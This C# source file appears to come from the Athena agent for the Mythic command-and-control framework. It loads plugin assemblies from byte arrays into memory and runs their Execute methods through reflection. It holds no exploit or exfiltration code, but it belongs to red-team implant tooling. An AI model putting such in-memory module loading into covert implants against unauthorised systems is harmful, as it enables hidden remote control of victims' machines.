using Athena.Commands.Model;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.IO;

namespace Athena.Commands
{
    public class AssemblyHandler
    {

        /// <summary>
        /// Load a Mythic command
        /// </summary>
        /// <param name="asm">Byte array of the assembly to load</param>
        /// <param name="name">Name of the command being loaded</param>
        public static string LoadCommand(byte[] asm, string name)
        {
            try
            {
                if (!Globals.loadedcommands.ContainsKey(name))
                {
                    Globals.loadedcommands.Add(name, Globals.loadcontext.LoadFromStream(new MemoryStream(asm)));
                    return "Command Loaded!";
                }
                else
                {
                    return "Command already loaded!";
                }
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return "Failed to load Command!" + Environment.NewLine + e.Message;
            }
        }

        /// <summary>
        /// Execute a loaded Mythic command
        /// </summary>
        /// <param name="name">Name of the command to execute</param>
        /// <param name="args">Args string to pass to the assembly</param>
        public static PluginResponse RunLoadedCommand(string name, Dictionary<string, object> args)
        {
            try
            {
                Type t = Globals.loadedcommands[name].GetType("Athena.Plugin");
                var methodInfo = t.GetMethod("Execute", new Type[] { typeof(Dictionary<string,object>) });
                var result = methodInfo.Invoke(null, new object[] { args });

                PluginResponse pr = new PluginResponse()
                {
                    output = (string)result.GetType().GetProperty("output").GetValue(result),
                    success = (bool)result.GetType().GetProperty("success").GetValue(result)
                };
                return pr;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return new PluginResponse()
                {
                    output = e.Message,
                    success = false
                };
            }
        }
    }
}
